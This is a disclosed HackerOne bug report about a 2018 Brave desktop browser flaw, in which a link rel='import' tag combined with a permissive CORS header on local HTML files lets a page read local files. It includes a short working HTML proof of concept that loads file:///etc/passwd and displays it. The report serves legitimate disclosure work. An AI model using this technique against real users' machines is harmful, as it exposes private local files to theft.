---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '375329'
original_report_id: '375329'
title: Local files reading using `link[rel="import"]`
team_handle: brave
created_at: '2018-07-02T12:25:56.922Z'
disclosed_at: '2018-09-29T00:16:24.191Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 42
asset_identifier: https://github.com/brave/browser-laptop
asset_type: SOURCE_CODE
max_severity: none
tags:
- hackerone
---

# Local files reading using `link[rel="import"]`

## Metadata

- HackerOne Report ID: 375329
- Weakness: 
- Program: brave
- Disclosed At: 2018-09-29T00:16:24.191Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:

HTML file could import another file using `<link rel="import">`.  Brave returns `Access-Control-Allow-Origin: *` response header for local HTML files. That leads to local files reading.

> This vulnerability makes #369218 critical.

## Products affected: 

Brave: 0.23.19 
V8: 6.7.288.46 
rev: 178c3fbc045a0cbdbe098db08307503cce952081 
Muon: 7.1.3 
OS Release: 17.6.0 
Update Channel: Release 
OS Architecture: x64 
OS Platform: macOS 
Node.js: 7.9.0 
Brave Sync: v1.4.2 
libchromiumcontent: 67.0.3396.87

## Steps To Reproduce:

PoC:
``` html
<head>
    <script>
        function show() {
            var file = link.import.querySelector('body')
            alert(file.innerHTML)
        }
    </script>
    <link id="link" href="file:///etc/passwd" rel="import" as="document" onload="show()" />
</head>
```

## Supporting Material/References:

Screencast + PoC attached.

## Impact

Local files reading is forbidden in any browser.
Also, note that this vulnerability makes  #369218 critical.

> Probably all platforms(macOS/Win/Linux) are affected.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
